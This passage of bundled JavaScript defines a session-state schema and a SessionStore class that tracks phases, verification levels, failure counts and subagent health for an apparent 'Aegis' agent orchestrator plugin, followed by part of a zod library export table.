  contradictionArtifactLockActive: exports_external.boolean().default(false),
  contradictionArtifacts: exports_external.array(exports_external.string()).default([]),
  mdScribePrimaryStreak: exports_external.number().int().nonnegative().default(0),
  verifyFailCount: exports_external.number().int().nonnegative(),
  readonlyInconclusiveCount: exports_external.number().int().nonnegative(),
  contextFailCount: exports_external.number().int().nonnegative(),
  timeoutFailCount: exports_external.number().int().nonnegative(),
  envParityChecked: exports_external.boolean().default(false),
  envParityAllMatch: exports_external.boolean().default(false),
  envParityRequired: exports_external.boolean().default(false),
  envParityRequirementReason: exports_external.string().default(""),
  envParitySummary: exports_external.string().default(""),
  envParityUpdatedAt: exports_external.number().int().nonnegative().default(0),
  revVmSuspected: exports_external.boolean().default(false),
  revLoaderVmDetected: exports_external.boolean().default(false),
  revRiskScore: exports_external.number().nonnegative().default(0),
  revRiskSignals: exports_external.array(exports_external.string()).default([]),
  revStaticTrust: exports_external.number().min(0).max(1).default(1),
  decoySuspect: exports_external.boolean().default(false),
  decoySuspectReason: exports_external.string().default(""),
  oraclePassCount: exports_external.number().int().nonnegative().default(0),
  oracleFailIndex: exports_external.number().int().default(-1),
  oracleTotalTests: exports_external.number().int().nonnegative().default(0),
  oracleProgressUpdatedAt: exports_external.number().int().nonnegative().default(0),
  oracleProgressImprovedAt: exports_external.number().int().nonnegative().default(0),
  contradictionSLALoops: exports_external.number().int().nonnegative().default(0),
  contradictionSLADumpRequired: exports_external.boolean().default(false),
  unsatCrossValidationCount: exports_external.number().int().nonnegative().default(0),
  unsatUnhookedOracleRun: exports_external.boolean().default(false),
  unsatArtifactDigestVerified: exports_external.boolean().default(false),
  replayLowTrustBinaries: exports_external.array(exports_external.string()).default([]),
  toolCallCount: exports_external.number().int().nonnegative().default(0),
  aegisToolCallCount: exports_external.number().int().nonnegative().default(0),
  lastToolCallAt: exports_external.number().int().nonnegative().default(0),
  toolCallHistory: exports_external.array(exports_external.string()).default([]),
  recentEvents: exports_external.array(exports_external.string()),
  lastTaskCategory: exports_external.string(),
  lastTaskRoute: exports_external.string().default(""),
  lastTaskSubagent: exports_external.string().default(""),
  lastTaskModel: exports_external.string().default(""),
  lastTaskVariant: exports_external.string().default(""),
  pendingTaskFailover: exports_external.boolean(),
  taskFailoverCount: exports_external.number().int().nonnegative(),
  dispatchHealthBySubagent: exports_external.record(exports_external.string(), SubagentDispatchHealthSchema).default({}),
  subagentProfileOverrides: exports_external.record(exports_external.string(), SubagentProfileOverrideSchema).default({}),
  modelHealthByModel: exports_external.record(exports_external.string(), ModelHealthEntrySchema).default({}),
  lastFailureReason: exports_external.enum([
    "none",
    "verification_mismatch",
    "tooling_timeout",
    "context_overflow",
    "hypothesis_stall",
    "unsat_claim",
    "static_dynamic_contradiction",
    "exploit_chain",
    "environment"
  ]),
  lastFailureSummary: exports_external.string(),
  lastFailedRoute: exports_external.string(),
  lastFailureAt: exports_external.number().int().nonnegative(),
  failureReasonCounts: FailureReasonCountsSchema,
  lastUpdatedAt: exports_external.number().int().nonnegative()
});
var SessionMapSchema = exports_external.record(exports_external.string(), SessionStateSchema);
var SessionStoreEnvelopeSchema = exports_external.object({
  schemaVersion: exports_external.literal(2),
  sessions: SessionMapSchema
});
var SessionStoreSchemaVersionSchema = exports_external.object({
  schemaVersion: exports_external.number()
});
var CONTRADICTION_PATCH_LOOP_BUDGET = 2;

class SessionStore {
  filePath;
  stateMap = new Map;
  observer;
  defaultMode;
  asyncPersistence;
  onPersist;
  persistenceDegraded = false;
  observerDegraded = false;
  persistenceBlockedByFutureSchema = false;
  persistFlusher;
  constructor(baseDirectory, observer, defaultMode = DEFAULT_STATE.mode, stateRootDir = ".Aegis", options = {}) {
    this.filePath = join10(baseDirectory, stateRootDir, "orchestrator_state.json");
    this.observer = observer;
    this.defaultMode = defaultMode;
    this.asyncPersistence = options.asyncPersistence === true;
    const flushDelayMs = typeof options.flushDelayMs === "number" && Number.isFinite(options.flushDelayMs) ? Math.max(0, Math.floor(options.flushDelayMs)) : 30;
    this.onPersist = options.onPersist;
    this.persistFlusher = new DebouncedSyncFlusher({
      enabled: this.asyncPersistence,
      delayMs: flushDelayMs,
      isBlocked: () => this.persistenceDegraded,
      runSync: () => this.persistSync(),
      buildMetric: ({ trigger, durationMs, result }) => ({
        trigger,
        durationMs,
        stateCount: this.stateMap.size,
        payloadBytes: result.payloadBytes,
        asyncPersistence: this.asyncPersistence,
        failed: !result.ok,
        reason: result.reason
      }),
      onMetric: this.onPersist
    });
    this.load();
  }
  flushNow() {
    this.persistFlusher.flushNow();
  }
  get(sessionID) {
    const existing = this.stateMap.get(sessionID);
    if (existing) {
      return existing;
    }
    const fresh = {
      ...DEFAULT_STATE,
      mode: this.defaultMode,
      alternatives: [...DEFAULT_STATE.alternatives],
      recentEvents: [...DEFAULT_STATE.recentEvents],
      contradictionArtifacts: [...DEFAULT_STATE.contradictionArtifacts],
      replayLowTrustBinaries: [...DEFAULT_STATE.replayLowTrustBinaries],
      toolCallHistory: [...DEFAULT_STATE.toolCallHistory],
      failureReasonCounts: { ...DEFAULT_STATE.failureReasonCounts },
      lastTaskModel: "",
      lastTaskVariant: "",
      dispatchHealthBySubagent: {},
      subagentProfileOverrides: {},
      modelHealthByModel: {},
      lastUpdatedAt: Date.now()
    };
    this.stateMap.set(sessionID, fresh);
    return fresh;
  }
  update(sessionID, partial2) {
    const state = this.get(sessionID);
    Object.assign(state, partial2, { lastUpdatedAt: Date.now() });
    this.persist();
    return state;
  }
  setMode(sessionID, mode) {
    const state = this.get(sessionID);
    state.mode = mode;
    state.modeExplicit = true;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_mode");
    return state;
  }
  setUltraworkEnabled(sessionID, enabled) {
    const state = this.get(sessionID);
    state.ultraworkEnabled = enabled;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_ultrawork_enabled");
    return state;
  }
  setThinkMode(sessionID, mode) {
    const state = this.get(sessionID);
    state.thinkMode = mode;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_think_mode");
    return state;
  }
  setAutoLoopEnabled(sessionID, enabled) {
    const state = this.get(sessionID);
    state.autoLoopEnabled = enabled;
    if (!enabled) {
      state.autoLoopIterations = 0;
      state.autoLoopStartedAt = 0;
      state.autoLoopLastPromptAt = 0;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_auto_loop_enabled");
    return state;
  }
  recordAutoLoopPrompt(sessionID) {
    const state = this.get(sessionID);
    const now = Date.now();
    if (state.autoLoopStartedAt <= 0) {
      state.autoLoopStartedAt = now;
    }
    state.autoLoopIterations += 1;
    state.autoLoopLastPromptAt = now;
    state.lastUpdatedAt = now;
    this.persist();
    this.notify(sessionID, state, "record_auto_loop_prompt");
    return state;
  }
  setTargetType(sessionID, targetType) {
    const state = this.get(sessionID);
    state.targetType = targetType;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_target_type");
    return state;
  }
  setHypothesis(sessionID, hypothesis) {
    const state = this.get(sessionID);
    state.hypothesis = hypothesis;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_hypothesis");
    return state;
  }
  setAlternatives(sessionID, alternatives) {
    const state = this.get(sessionID);
    state.alternatives = alternatives.map((item) => item.trim()).filter((item) => item.length > 0);
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_alternatives");
    return state;
  }
  setEnvParity(sessionID, allMatch, summary = "") {
    const state = this.get(sessionID);
    state.envParityChecked = true;
    state.envParityAllMatch = allMatch;
    state.envParitySummary = summary.trim();
    state.envParityUpdatedAt = Date.now();
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_env_parity");
    return state;
  }
  setEnvParityRequired(sessionID, required2, reason = "") {
    const state = this.get(sessionID);
    state.envParityRequired = required2;
    state.envParityRequirementReason = reason.trim();
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_env_parity_required");
    return state;
  }
  setRevRisk(sessionID, risk) {
    const state = this.get(sessionID);
    state.revVmSuspected = risk.vmSuspected;
    state.revRiskScore = risk.score;
    state.revRiskSignals = [...risk.signals];
    state.revStaticTrust = risk.staticTrust;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_rev_risk");
    return state;
  }
  setCandidate(sessionID, candidate) {
    const state = this.get(sessionID);
    state.latestCandidate = candidate;
    state.candidatePendingVerification = candidate.trim().length > 0;
    state.submissionPending = false;
    state.submissionAccepted = false;
    state.latestAcceptanceEvidence = "";
    if (state.candidatePendingVerification) {
      state.candidateLevel = "L1";
      if (state.phase === "EXECUTE" || state.phase === "PLAN") {
        state.phase = "VERIFY";
      }
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_candidate");
    return state;
  }
  setVerified(sessionID, verified) {
    const state = this.get(sessionID);
    state.latestVerified = verified;
    if (verified.trim().length > 0) {
      state.candidateLevel = "L3";
      state.submissionAccepted = true;
      state.submissionPending = false;
      state.phase = "SUBMIT";
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_verified");
    return state;
  }
  setAcceptanceEvidence(sessionID, evidence) {
    const state = this.get(sessionID);
    state.latestAcceptanceEvidence = evidence.trim();
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_acceptance_evidence");
    return state;
  }
  setCandidateLevel(sessionID, level) {
    const state = this.get(sessionID);
    const rank = {
      L0: 0,
      L1: 1,
      L2: 2,
      L3: 3
    };
    if (rank[level] >= rank[state.candidateLevel]) {
      state.candidateLevel = level;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_candidate_level");
    return state;
  }
  recordFailure(sessionID, reason, routeName = "", summary = "") {
    const state = this.get(sessionID);
    state.lastFailureReason = reason;
    state.lastFailedRoute = routeName;
    state.lastFailureSummary = summary;
    state.lastFailureAt = Date.now();
    state.failureReasonCounts[reason] += 1;
    if (reason === "static_dynamic_contradiction") {
      state.contradictionArtifactLockActive = true;
      state.contradictionPatchDumpDone = false;
      if (state.contradictionPivotDebt <= 0) {
        state.contradictionPivotDebt = CONTRADICTION_PATCH_LOOP_BUDGET;
      }
      state.contradictionArtifacts = [];
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "record_failure");
    return state;
  }
  setFailureDetails(sessionID, reason, routeName = "", summary = "") {
    const state = this.get(sessionID);
    state.lastFailureReason = reason;
    state.lastFailedRoute = routeName;
    state.lastFailureSummary = summary;
    state.lastFailureAt = Date.now();
    if (reason === "static_dynamic_contradiction") {
      state.contradictionArtifactLockActive = true;
      state.contradictionPatchDumpDone = false;
      if (state.contradictionPivotDebt <= 0) {
        state.contradictionPivotDebt = CONTRADICTION_PATCH_LOOP_BUDGET;
      }
      state.contradictionArtifacts = [];
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_failure_details");
    return state;
  }
  clearFailure(sessionID) {
    const state = this.get(sessionID);
    state.lastFailureReason = "none";
    state.lastFailedRoute = "";
    state.lastFailureSummary = "";
    state.lastFailureAt = 0;
    state.contradictionArtifactLockActive = false;
    state.contradictionPatchDumpDone = false;
    state.contradictionPivotDebt = 0;
    state.contradictionArtifacts = [];
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "clear_failure");
    return state;
  }
  setLastTaskCategory(sessionID, category) {
    const state = this.get(sessionID);
    state.lastTaskCategory = category;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_last_task_category");
    return state;
  }
  setLastDispatch(sessionID, routeName, subagentType, model = "", variant = "") {
    const state = this.get(sessionID);
    state.lastTaskRoute = routeName;
    state.lastTaskSubagent = subagentType;
    state.lastTaskModel = model.trim();
    state.lastTaskVariant = variant.trim();
    const normalizedRoute = routeName.trim().toLowerCase();
    if (normalizedRoute === "md-scribe") {
      state.mdScribePrimaryStreak += 1;
    } else {
      state.mdScribePrimaryStreak = 0;
    }
    const pattern = subagentType.trim() || routeName.trim();
    if (!pattern) {
      state.lastToolPattern = "";
      state.staleToolPatternLoops = 0;
    } else if (state.lastToolPattern === pattern) {
      state.staleToolPatternLoops += 1;
    } else {
      state.lastToolPattern = pattern;
      state.staleToolPatternLoops = 1;
    }
    if (state.contradictionPivotDebt > 0 && !state.contradictionPatchDumpDone) {
      state.contradictionPivotDebt = Math.max(0, state.contradictionPivotDebt - 1);
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_last_dispatch");
    return state;
  }
  recordContradictionArtifacts(sessionID, artifacts) {
    const state = this.get(sessionID);
    const normalized = artifacts.map((item) => item.trim()).filter((item) => item.length > 0).slice(0, 20);
    if (normalized.length === 0) {
      return state;
    }
    const merged = [...state.contradictionArtifacts, ...normalized];
    state.contradictionArtifacts = [...new Set(merged)].slice(-20);
    state.contradictionPatchDumpDone = true;
    state.contradictionArtifactLockActive = false;
    state.contradictionPivotDebt = 0;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "record_contradiction_artifacts");
    return state;
  }
  recordDispatchOutcome(sessionID, outcome) {
    const state = this.get(sessionID);
    const subagentType = state.lastTaskSubagent.trim();
    if (!subagentType) {
      return state;
    }
    const health = this.getOrCreateDispatchHealth(state, subagentType);
    health.lastOutcomeAt = Date.now();
    if (outcome === "success") {
      health.successCount += 1;
      health.consecutiveFailureCount = 0;
    } else if (outcome === "retryable_failure") {
      health.retryableFailureCount += 1;
      health.consecutiveFailureCount += 1;
    } else {
      health.hardFailureCount += 1;
      health.consecutiveFailureCount += 1;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "record_dispatch_outcome");
    return state;
  }
  setSubagentProfileOverride(sessionID, subagentType, profile) {
    const state = this.get(sessionID);
    const key = subagentType.trim();
    const model = profile.model.trim();
    const variant = profile.variant.trim();
    if (!key || !model) {
      return state;
    }
    state.subagentProfileOverrides[key] = {
      model,
      variant
    };
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_subagent_profile_override");
    return state;
  }
  clearSubagentProfileOverride(sessionID, subagentType) {
    const state = this.get(sessionID);
    const key = typeof subagentType === "string" ? subagentType.trim() : "";
    if (key) {
      delete state.subagentProfileOverrides[key];
    } else {
      state.subagentProfileOverrides = {};
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "clear_subagent_profile_override");
    return state;
  }
  triggerTaskFailover(sessionID) {
    const state = this.get(sessionID);
    state.pendingTaskFailover = true;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "trigger_task_failover");
    return state;
  }
  consumeTaskFailover(sessionID) {
    const state = this.get(sessionID);
    state.pendingTaskFailover = false;
    state.taskFailoverCount += 1;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "consume_task_failover");
    return state;
  }
  clearTaskFailover(sessionID) {
    const state = this.get(sessionID);
    state.pendingTaskFailover = false;
    state.taskFailoverCount = 0;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "clear_task_failover");
    return state;
  }
  applyEvent(sessionID, event) {
    const state = this.get(sessionID);
    state.recentEvents.push(event);
    if (state.recentEvents.length > 30) {
      state.recentEvents = state.recentEvents.slice(-30);
    }
    switch (event) {
      case "scan_completed":
        state.phase = "PLAN";
        break;
      case "plan_completed":
        state.phase = state.candidatePendingVerification ? "VERIFY" : "EXECUTE";
        break;
      case "candidate_found":
        state.candidatePendingVerification = true;
        state.candidateLevel = "L1";
        state.submissionPending = false;
        state.submissionAccepted = false;
        state.latestAcceptanceEvidence = "";
        if (state.phase === "PLAN" || state.phase === "EXECUTE") {
          state.phase = "VERIFY";
        }
        state.contextFailCount = Math.max(0, state.contextFailCount - 1);
        state.timeoutFailCount = Math.max(0, state.timeoutFailCount - 1);
        break;
      case "verify_success":
        state.candidatePendingVerification = false;
        state.candidateLevel = "L2";
        state.phase = "SUBMIT";
        state.submissionPending = true;
        state.submissionAccepted = false;
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        state.verifyFailCount = 0;
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.contradictionArtifactLockActive = false;
        state.contradictionArtifacts = [];
        break;
      case "verify_fail":
        state.candidatePendingVerification = false;
        state.phase = "EXECUTE";
        state.submissionPending = false;
        state.submissionAccepted = false;
        state.latestAcceptanceEvidence = "";
        state.candidateLevel = state.latestCandidate.trim().length > 0 ? "L1" : "L0";
        state.verifyFailCount += 1;
        state.noNewEvidenceLoops += 1;
        state.lastFailureReason = "verification_mismatch";
        state.failureReasonCounts.verification_mismatch += 1;
        state.lastFailureAt = Date.now();
        break;
      case "submit_accepted":
        state.phase = "SUBMIT";
        state.submissionPending = false;
        state.submissionAccepted = true;
        state.candidateLevel = "L3";
        if (!state.latestVerified && state.latestCandidate) {
          state.latestVerified = state.latestCandidate;
        }
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        state.verifyFailCount = 0;
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.contradictionArtifactLockActive = false;
        state.contradictionArtifacts = [];
        state.mdScribePrimaryStreak = 0;
        state.pendingTaskFailover = false;
        state.taskFailoverCount = 0;
        break;
      case "submit_rejected":
        state.phase = "EXECUTE";
        state.submissionPending = false;
        state.submissionAccepted = false;
        state.candidateLevel = state.latestCandidate.trim().length > 0 ? "L1" : "L0";
        state.verifyFailCount += 1;
        state.lastFailureReason = "verification_mismatch";
        state.failureReasonCounts.verification_mismatch += 1;
        state.lastFailureAt = Date.now();
        break;
      case "no_new_evidence":
        state.noNewEvidenceLoops += 1;
        state.lastFailureReason = "hypothesis_stall";
        state.failureReasonCounts.hypothesis_stall += 1;
        state.lastFailureAt = Date.now();
        break;
      case "same_payload_repeat":
        state.samePayloadLoops += 1;
        state.lastFailureReason = "hypothesis_stall";
        state.failureReasonCounts.hypothesis_stall += 1;
        state.lastFailureAt = Date.now();
        break;
      case "new_evidence":
        if (state.phase === "VERIFY" || state.phase === "SUBMIT") {
          state.phase = "EXECUTE";
        }
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.contradictionArtifactLockActive = false;
        state.contradictionArtifacts = [];
        state.submissionPending = false;
        state.submissionAccepted = false;
        state.latestAcceptanceEvidence = "";
        state.candidateLevel = state.latestCandidate.trim().length > 0 ? "L1" : "L0";
        state.pendingTaskFailover = false;
        state.taskFailoverCount = 0;
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        state.contextFailCount = Math.max(0, state.contextFailCount - 1);
        state.timeoutFailCount = Math.max(0, state.timeoutFailCount - 1);
        break;
      case "readonly_inconclusive":
        state.readonlyInconclusiveCount += 1;
        break;
      case "scope_confirmed":
        state.scopeConfirmed = true;
        break;
      case "context_length_exceeded":
        state.contextFailCount += 1;
        state.lastFailureReason = "context_overflow";
        state.failureReasonCounts.context_overflow += 1;
        state.lastFailureAt = Date.now();
        break;
      case "timeout":
        state.timeoutFailCount += 1;
        state.lastFailureReason = "tooling_timeout";
        state.failureReasonCounts.tooling_timeout += 1;
        state.lastFailureAt = Date.now();
        break;
      case "unsat_claim":
        state.lastFailureReason = "unsat_claim";
        state.failureReasonCounts.unsat_claim += 1;
        state.lastFailureAt = Date.now();
        break;
      case "static_dynamic_contradiction":
        state.lastFailureReason = "static_dynamic_contradiction";
        state.failureReasonCounts.static_dynamic_contradiction += 1;
        state.lastFailureAt = Date.now();
        state.contradictionPivotDebt = CONTRADICTION_PATCH_LOOP_BUDGET;
        state.contradictionPatchDumpDone = false;
        state.contradictionArtifactLockActive = true;
        state.contradictionArtifacts = [];
        break;
      case "decoy_suspect":
        if (!state.decoySuspect) {
          state.decoySuspect = true;
        }
        if (state.decoySuspectReason.trim().length === 0) {
          state.decoySuspectReason = "decoy_suspect event applied";
        }
        break;
      case "oracle_progress":
        state.oracleProgressUpdatedAt = Date.now();
        break;
      case "replay_low_trust":
        break;
      case "contradiction_sla_dump_done":
        if (!state.contradictionPatchDumpDone) {
          state.contradictionPatchDumpDone = true;
        }
        if (state.contradictionSLADumpRequired) {
          state.contradictionSLADumpRequired = false;
        }
        if (state.contradictionArtifactLockActive) {
          state.contradictionArtifactLockActive = false;
        }
        if (state.contradictionPivotDebt !== 0) {
          state.contradictionPivotDebt = 0;
        }
        break;
      case "unsat_cross_validated":
        if (state.unsatCrossValidationCount < 99) {
          state.unsatCrossValidationCount = Math.min(99, state.unsatCrossValidationCount + 1);
        }
        break;
      case "unsat_unhooked_oracle":
        if (!state.unsatUnhookedOracleRun) {
          state.unsatUnhookedOracleRun = true;
        }
        break;
      case "unsat_artifact_digest":
        if (!state.unsatArtifactDigestVerified) {
          state.unsatArtifactDigestVerified = true;
        }
        break;
      case "reset_loop":
        state.phase = "SCAN";
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.contradictionArtifactLockActive = false;
        state.contradictionArtifacts = [];
        state.candidateLevel = state.latestVerified.trim().length > 0 ? "L3" : "L0";
        state.submissionPending = false;
        state.submissionAccepted = state.latestVerified.trim().length > 0;
        state.latestAcceptanceEvidence = "";
        state.mdScribePrimaryStreak = 0;
        state.readonlyInconclusiveCount = 0;
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        break;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, event);
    return state;
  }
  markModelUnhealthy(sessionID, modelId, reason) {
    const state = this.get(sessionID);
    state.modelHealthByModel[modelId] = {
      unhealthySince: Date.now(),
      reason
    };
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "mark_model_unhealthy");
    return state;
  }
  markModelHealthy(sessionID, modelId) {
    const state = this.get(sessionID);
    delete state.modelHealthByModel[modelId];
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "mark_model_healthy");
    return state;
  }
  toJSON() {
    const obj = {};
    for (const [key, value] of this.stateMap.entries()) {
      obj[key] = value;
    }
    return obj;
  }
  load() {
    if (!existsSync9(this.filePath)) {
      return;
    }
    try {
      const raw = readFileSync8(this.filePath, "utf-8");
      const decoded = JSON.parse(raw);
      const versionProbe = SessionStoreSchemaVersionSchema.safeParse(decoded);
      if (versionProbe.success && versionProbe.data.schemaVersion > 2) {
        this.persistenceBlockedByFutureSchema = true;
        console.warn(`[session-store] Unsupported orchestrator state schema version ${versionProbe.data.schemaVersion}; using empty in-memory state and preserving on-disk file.`);
        return;
      }
      let sessions = null;
      const v2Parsed = SessionStoreEnvelopeSchema.safeParse(decoded);
      if (v2Parsed.success) {
        sessions = v2Parsed.data.sessions;
      } else if (!versionProbe.success) {
        const v1Parsed = SessionMapSchema.safeParse(decoded);
        if (!v1Parsed.success) {
          return;
        }
        sessions = v1Parsed.data;
      } else {
        return;
      }
      for (const [sessionID, state] of Object.entries(sessions)) {
        const hydrated = {
          ...DEFAULT_STATE,
          ...state,
          alternatives: [...state.alternatives],
          recentEvents: [...state.recentEvents],
          contradictionArtifacts: [...state.contradictionArtifacts],
          replayLowTrustBinaries: [...state.replayLowTrustBinaries],
          toolCallHistory: [...state.toolCallHistory],
          failureReasonCounts: { ...state.failureReasonCounts },
          dispatchHealthBySubagent: { ...state.dispatchHealthBySubagent },
          subagentProfileOverrides: { ...state.subagentProfileOverrides },
          modelHealthByModel: { ...state.modelHealthByModel }
        };
        if (!hydrated.contradictionArtifactLockActive && hydrated.contradictionPivotDebt > 0 && !hydrated.contradictionPatchDumpDone) {
          hydrated.contradictionArtifactLockActive = true;
        }
        this.stateMap.set(sessionID, hydrated);
      }
    } catch {}
  }
  persist() {
    if (this.persistenceBlockedByFutureSchema) {
      return;
    }
    this.persistFlusher.request();
  }
  persistSync() {
    const payload = JSON.stringify({
      schemaVersion: 2,
      sessions: this.toJSON()
    }) + `
`;
    const payloadBytes = Buffer.byteLength(payload, "utf-8");
    const dir = dirname4(this.filePath);
    try {
      mkdirSync5(dir, { recursive: true });
      atomicWriteFileSync(this.filePath, payload);
      return { ok: true, payloadBytes, reason: "" };
    } catch {
      this.persistenceDegraded = true;
      return { ok: false, payloadBytes, reason: "persist_failed" };
    }
  }
  notify(sessionID, state, reason) {
    if (!this.observer || this.observerDegraded) {
      return;
    }
    try {
      this.observer({
        sessionID,
        state: { ...state },
        reason
      });
    } catch {
      this.observerDegraded = true;
    }
  }
  getOrCreateDispatchHealth(state, subagentType) {
    const existing = state.dispatchHealthBySubagent[subagentType];
    if (existing) {
      return existing;
    }
    const fresh = {
      successCount: 0,
      retryableFailureCount: 0,
      hardFailureCount: 0,
      consecutiveFailureCount: 0,
      lastOutcomeAt: 0
    };
    state.dispatchHealthBySubagent[subagentType] = fresh;
    return fresh;
  }
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/external.js
var exports_external2 = {};
__export(exports_external2, {
  xid: () => xid4,
  void: () => _void4,
  uuidv7: () => uuidv72,
  uuidv6: () => uuidv62,
  uuidv4: () => uuidv42,
  uuid: () => uuid5,
  util: () => exports_util2,
  url: () => url2,
  uppercase: () => _uppercase2,
  unknown: () => unknown2,
  union: () => union2,
  undefined: () => _undefined6,
  ulid: () => ulid4,
  uint64: () => uint642,
  uint32: () => uint322,
  tuple: () => tuple2,
  trim: () => _trim2,
  treeifyError: () => treeifyError2,
  transform: () => transform2,
  toUpperCase: () => _toUpperCase2,
  toLowerCase: () => _toLowerCase2,
  toJSONSchema: () => toJSONSchema2,
  templateLiteral: () => templateLiteral2,
  symbol: () => symbol2,
  superRefine: () => superRefine2,
  success: () => success2,
  stringbool: () => stringbool2,
  stringFormat: () => stringFormat2,
  string: () => string5,
  strictObject: () => strictObject2,
  startsWith: () => _startsWith2,
  size: () => _size2,
  setErrorMap: () => setErrorMap2,
  set: () => set2,
  safeParseAsync: () => safeParseAsync4,
  safeParse: () => safeParse4,
  safeEncodeAsync: () => safeEncodeAsync4,
  safeEncode: () => safeEncode4,
  safeDecodeAsync: () => safeDecodeAsync4,
  safeDecode: () => safeDecode4,
  registry: () => registry2,
  regexes: () => exports_regexes2,
  regex: () => _regex2,
  refine: () => refine2,
  record: () => record2,
  readonly: () => readonly2,
  property: () => _property2,
  promise: () => promise2,
  prettifyError: () => prettifyError2,
  preprocess: () => preprocess2,
  prefault: () => prefault2,
  positive: () => _positive2,
  pipe: () => pipe2,
  partialRecord: () => partialRecord2,
  parseAsync: () => parseAsync4,
  parse: () => parse7,
  overwrite: () => _overwrite2,
  optional: () => optional2,
  object: () => object2,
  number: () => number5,
  nullish: () => nullish4,
  nullable: () => nullable2,
  null: () => _null6,
  normalize: () => _normalize2,
  nonpositive: () => _nonpositive2,
  nonoptional: () => nonoptional2,
  nonnegative: () => _nonnegative2,
  never: () => never2,
  negative: () => _negative2,
  nativeEnum: () => nativeEnum2,
  nanoid: () => nanoid4,
  nan: () => nan2,
  multipleOf: () => _multipleOf2,
  minSize: () => _minSize2,
  minLength: () => _minLength2,
  mime: () => _mime2,
  maxSize: () => _maxSize2,
  maxLength: () => _maxLength2,
  map: () => map2,
  lte: () => _lte2,
  lt: () => _lt2,
  lowercase: () => _lowercase2,
  looseObject: () => looseObject2,
  locales: () => exports_locales2,
  literal: () => literal2,
  length: () => _length2,
  lazy: () => lazy2,
  ksuid: () => ksuid4,
  keyof: () => keyof2,
  jwt: () => jwt2,
  json: () => json2,
  iso: () => exports_iso2,
  ipv6: () => ipv64,
  ipv4: () => ipv44,
  intersection: () => intersection2,
  int64: () => int642,
  int32: () => int322,
  int: () => int2,
  instanceof: () => _instanceof2,
  includes: () => _includes2,
  httpUrl: () => httpUrl2,
  hostname: () => hostname4,
  hex: () => hex4,
  hash: () => hash2,
  guid: () => guid4,
  gte: () => _gte2,
  gt: () => _gt2,
  globalRegistry: () => globalRegistry2,
  getErrorMap: () => getErrorMap2,
  function: () => _function2,
  formatError: () => formatError2,
  float64: () => float642,
  float32: () => float322,
  flattenError: () => flattenError2,
  file: () => file2,
  enum: () => _enum4,
  endsWith: () => _endsWith2,
  encodeAsync: () => encodeAsync4,
  encode: () => encode4,
  emoji: () => emoji4,
  email: () => email4,
  e164: () => e1644,
  discriminatedUnion: () => discriminatedUnion2,
  decodeAsync: () => decodeAsync4,
  decode: () => decode4,
  date: () => date7,
  custom: () => custom2,
  cuid2: () => cuid24,
  cuid: () => cuid6,
  core: () => exports_core4,
  config: () => config2,
  coerce: () => exports_coerce2,
  codec: () => codec2,
  clone: () => clone2,
  cidrv6: () => cidrv64,
  cidrv4: () => cidrv44,
  check: () => check2,
  catch: () => _catch4,
  boolean: () => boolean5,
  bigint: () => bigint5,
  base64url: () => base64url4,
  base64: () => base644,
  array: () => array2,
  any: () => any2,
